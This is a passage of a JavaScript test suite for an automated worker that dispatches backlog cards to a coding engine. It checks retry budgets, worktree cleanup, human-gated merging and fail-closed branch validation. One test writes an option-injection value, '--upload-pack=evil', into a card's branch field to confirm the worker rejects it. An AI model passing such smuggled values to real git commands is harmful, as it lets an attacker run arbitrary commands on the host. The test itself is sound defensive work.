    const rejLedger = JSON.parse(fs.readFileSync(result.ledger, "utf8"));
    assert.equal(rejLedger.status, "rejected");
  } finally {
    fixture.cleanup();
  }
});

test("attempts backstop: card that keeps failing is not re-dispatched forever", () => {
  const fixture = makeProjectFixture();
  try {
    const runsDir = path.join(path.dirname(fixture.pmDir), ".pm", "loop-runs");
    fs.mkdirSync(runsDir, { recursive: true });
    const today = new Date().toISOString();
    for (let i = 0; i < 3; i += 1) {
      fs.writeFileSync(
        path.join(runsDir, `fail${i}.json`),
        JSON.stringify({
          status: "failed",
          stage: "dev",
          card: { id: "PM-T1" },
          started_at: today,
        })
      );
    }
    const result = runWorker(fixture.project, { pmDir: fixture.pmDir });
    assert.equal(result.status, "attempts-exhausted", JSON.stringify(result));
    assert.match(result.reason, /needs a human look/);
    assert.equal(
      fs.existsSync(path.join(fixture.pmDir, "loop", "leases")),
      false,
      "attempt budget stops before any lease directory is created"
    );
  } finally {
    fixture.cleanup();
  }
});

test("ship cycles have their own budget and do not consume the dev budget", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pm-loop-shipbudget-"));
  try {
    const today = new Date("2026-07-02T10:00:00Z").toISOString();
    for (let i = 0; i < 20; i += 1) {
      fs.writeFileSync(
        path.join(dir, `ship${i}.json`),
        JSON.stringify({ status: "completed", stage: "ship", started_at: today })
      );
    }
    fs.writeFileSync(
      path.join(dir, "dev1.json"),
      JSON.stringify({ status: "completed", stage: "dev", started_at: today })
    );
    const now = new Date("2026-07-02T11:00:00Z");
    assert.equal(countRunsToday(dir, now), 1);
    assert.equal(countRunsToday(dir, now, { stage: "ship" }), 20);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("failed ship cycle removes its worktree so the next cycle can proceed", () => {
  const fixture = makeProjectFixture();
  try {
    git(["checkout", "-b", "loop/pm-t1"], fixture.project);
    fs.writeFileSync(path.join(fixture.project, "work.txt"), "wip\n");
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "wip"], fixture.project);
    git(["push", "-u", "origin", "loop/pm-t1"], fixture.project);
    git(["checkout", "main"], fixture.project);

    const failEngine = writeFakeEngine(fixture.root, { exitCode: 3, marker: "fail-run" });
    fs.writeFileSync(
      path.join(fixture.pmDir, "backlog", "pm-t1.md"),
      [
        "---",
        'id: "PM-T1"',
        'title: "Test card"',
        "kind: task",
        "status: shipping",
        'branch: "loop/pm-t1"',
        "---",
        "",
        "Ship it.",
      ].join("\n") + "\n"
    );
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify({ worker: { engine_bin: failEngine } }, null, 2)
    );
    approveFixtureConfig(fixture);
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "shipping fixture"], fixture.project);
    git(["push"], fixture.project);

    const first = runWorker(fixture.project, {
      pmDir: fixture.pmDir,
      mode: "ship",
      runProbe: () => ({ status: 0, stdout: "", stderr: "" }),
    });
    assert.equal(first.status, "failed", JSON.stringify(first));
    // Worktree removed despite failure — card.branch is free for the next cycle.
    const worktrees = path.join(fixture.project, ".worktrees");
    assert.ok(!fs.existsSync(worktrees) || fs.readdirSync(worktrees).length === 0);
    // Ship branch itself must survive cleanup.
    assert.ok(git(["rev-parse", "--verify", "loop/pm-t1"], fixture.project).length > 0);

    const okEngine = writeFakeEngine(fixture.root, { exitCode: 0, marker: "ok-run" });
    git(["pull", "--rebase"], fixture.project);
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify({ worker: { engine_bin: okEngine } }, null, 2)
    );
    approveFixtureConfig(fixture);
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "swap engine"], fixture.project);
    git(["push"], fixture.project);

    const second = runWorker(fixture.project, { pmDir: fixture.pmDir, mode: "ship" });
    assert.equal(second.status, "completed", JSON.stringify(second));
  } finally {
    fixture.cleanup();
  }
});

test("rfc/research stage prompt produces artifacts, never PRs or shipping status", () => {
  const prompt = buildPrompt(
    {
      selected: {
        id: "PM-9",
        title: "T",
        kind: "task",
        command: "/pm:research PM-9",
        stage: "research",
      },
    },
    {}
  );
  assert.match(prompt, /do NOT open pull requests/);
  assert.match(prompt, /RFC approval is always human/);
  assert.doesNotMatch(prompt, /status: shipping/);
});

test("dev-stage prompt opens a PR, never merges, and hands off to ship wakes", () => {
  const prompt = buildPrompt({
    selected: { id: "PM-9", title: "T", kind: "task", command: "/pm:dev PM-9", stage: "dev" },
  });
  assert.match(prompt, /\/pm:dev PM-9/);
  assert.match(prompt, /do NOT merge it in this run/);
  assert.match(prompt, /status: shipping/);
  assert.match(prompt, /never skip or self-approve a gate/);
});

test("ship-stage prompt runs one bounded cycle; merge only with autonomy dial", () => {
  const plan = {
    selected: {
      id: "PM-9",
      title: "T",
      kind: "task",
      command: "/pm:ship PM-9",
      stage: "ship",
      branch: "loop/pm-9",
    },
  };

  const noMerge = buildPrompt(plan, { autonomy: { merge_pr: false } });
  assert.match(noMerge, /ONE bounded ship cycle/);
  assert.match(noMerge, /One cycle only/);
  assert.match(noMerge, /Do NOT merge/);
  assert.match(noMerge, /ready for human merge/);

  const withMerge = buildPrompt(plan, { autonomy: { merge_pr: true } });
  assert.match(withMerge, /Merge only when every review gate and CI check is green/);
  assert.match(withMerge, /update the backlog card status to done/);
  assert.doesNotMatch(withMerge, /Do NOT merge/);
});

test("ship-stage worker checks out the existing branch and runs one cycle", () => {
  const fixture = makeProjectFixture();
  try {
    // An in-flight PR branch, pushed; card in shipping state pointing at it.
    git(["checkout", "-b", "loop/pm-t1"], fixture.project);
    fs.writeFileSync(path.join(fixture.project, "work.txt"), "wip\n");
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "wip"], fixture.project);
    git(["push", "-u", "origin", "loop/pm-t1"], fixture.project);
    git(["checkout", "main"], fixture.project);

    const engineBin = writeFakeEngine(fixture.root);
    fs.writeFileSync(
      path.join(fixture.pmDir, "backlog", "pm-t1.md"),
      [
        "---",
        'id: "PM-T1"',
        'title: "Test card"',
        "kind: task",
        "status: shipping",
        'branch: "loop/pm-t1"',
        "---",
        "",
        "Ship it.",
      ].join("\n") + "\n"
    );
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify({ worker: { engine_bin: engineBin, keep_workspace: true } }, null, 2)
    );
    approveFixtureConfig(fixture);
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "shipping state"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, { pmDir: fixture.pmDir, mode: "ship" });
    assert.equal(result.status, "completed", JSON.stringify(result));
    assert.equal(result.branch, "loop/pm-t1");

    // Engine ran in a worktree checked out to the existing branch, with the
    // ship-cycle prompt on stdin.
    const prompt = fs.readFileSync(path.join(result.workspace, "engine-ran.txt"), "utf8");
    assert.match(prompt, /ONE bounded ship cycle/);
    assert.ok(fs.existsSync(path.join(result.workspace, "work.txt")));
  } finally {
    fixture.cleanup();
  }
});

test("ship-stage branch values are validated as refs, not passed to git argv", () => {
  const { isSafeBranchRef } = require("../scripts/loop-worker.js");
  assert.equal(isSafeBranchRef("loop/pm-9-202607021200"), true);
  assert.equal(isSafeBranchRef("feat/thing_2.x"), true);
  assert.equal(isSafeBranchRef("--upload-pack=evil"), false);
  assert.equal(isSafeBranchRef("-b"), false);
  assert.equal(isSafeBranchRef("a..b"), false);
  assert.equal(isSafeBranchRef("branch.lock"), false);
  assert.equal(isSafeBranchRef(""), false);

  const fixture = makeProjectFixture();
  try {
    fs.writeFileSync(
      path.join(fixture.pmDir, "backlog", "pm-t1.md"),
      [
        "---",
        'id: "PM-T1"',
        'title: "Test card"',
        "kind: task",
        "status: shipping",
        'branch: "--upload-pack=evil"',
        "---",
        "",
        "Ship it.",
      ].join("\n") + "\n"
    );
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "injected branch"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, { pmDir: fixture.pmDir, mode: "ship" });
    assert.equal(result.status, "bootstrap-failed", JSON.stringify(result));
    assert.equal(result.reason, "ship-branch-invalid");
  } finally {
    fixture.cleanup();
  }
});

test("ship-stage dispatch with a well-formed but nonexistent branch fails closed", () => {
  const fixture = makeProjectFixture();
  try {
    fs.writeFileSync(
      path.join(fixture.pmDir, "backlog", "pm-t1.md"),
      [
        "---",
        'id: "PM-T1"',
        'title: "Test card"',
        "kind: task",
        "status: shipping",
        'branch: "loop/never-created"',
        "---",
        "",
        "Ship it.",
      ].join("\n") + "\n"
    );
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "ghost branch"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, { pmDir: fixture.pmDir, mode: "ship" });
    assert.equal(result.status, "bootstrap-failed", JSON.stringify(result));
    assert.equal(result.reason, "ship-branch-not-found");
  } finally {
    fixture.cleanup();
  }
});

test("ship-stage dispatch without a recorded branch fails closed", () => {
  const fixture = makeProjectFixture();
  try {
    fs.writeFileSync(
      path.join(fixture.pmDir, "backlog", "pm-t1.md"),
      [
        "---",
        'id: "PM-T1"',
        'title: "Test card"',
        "kind: task",
        "status: shipping",
        "---",
        "",
        "Ship it.",
      ].join("\n") + "\n"
    );
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "shipping without branch"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, { pmDir: fixture.pmDir, mode: "ship" });
    assert.equal(result.status, "bootstrap-failed", JSON.stringify(result));
    assert.equal(result.reason, "ship-branch-missing");
    assert.equal(fs.existsSync(path.join(fixture.pmDir, "loop", "leases")), false);
  } finally {
    fixture.cleanup();
  }
});
